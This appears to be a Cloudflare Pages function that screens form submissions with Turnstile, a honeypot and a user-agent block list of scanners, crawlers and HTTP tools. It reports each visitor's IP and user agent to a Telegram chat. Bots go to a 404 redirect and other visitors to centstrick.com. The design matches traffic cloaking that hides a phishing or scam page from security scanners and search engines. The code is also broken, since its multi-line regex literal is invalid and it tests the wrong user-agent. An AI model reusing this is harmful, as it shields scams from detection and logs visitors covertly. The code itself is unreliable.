export async function onRequestPost(context) {
  const form = await context.request.formData();
  const token = form.get("cf-turnstile-response");
  const honeypot = form.get("nickname");

  const ip = context.request.headers.get("CF-Connecting-IP");
  const ua = context.request.headers.get("User-Agent");

  const isBotUA = /(?:
  bot|crawl|spider|slurp|fetch|scanner|harvest|httpclient|python|
  libwww|curl|wget|scrapy|axios|guzzle|okhttp|http_request2|java|
  php|perl|go-http-client|node-fetch|aiohttp|httpie|http-kit|
  phantomjs|headless|selenium|puppeteer|playwright|mechanize|
  urllib|restsharp|powershell|winhttp|cfnetwork|nmap|masscan|
  googlebot|bingbot|yandex|baiduspider|duckduckbot|semrush|mj12bot|
  ahrefsbot|facebookexternalhit|facebot|twitterbot|whatsapp|discordbot
)/i.test(navigator.userAgent);

  const logLine = `IP: ${ip}, UA: ${ua}, Honeypot: ${honeypot}`;

  // Log to Telegram
  if (context.env.TELEGRAM_BOT_TOKEN && context.env.TELEGRAM_CHAT_ID) {
    await fetch(`https://api.telegram.org/bot${context.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: context.env.TELEGRAM_CHAT_ID,
        text: `[Verify Triggered]\n${logLine}`
      }),
    });
  }

  // Turnstile verification
  const verify = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST",
    body: new URLSearchParams({
      secret: context.env.TURNSTILE_SECRET,
      response: token,
      remoteip: ip,
    }),
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  });

  const json = await verify.json();

  if (honeypot || isBotUA || !json.success) {
    return Response.redirect("https://redirect-404.com", 302);
  }

  return Response.redirect("https://centstrick.com", 302);
}
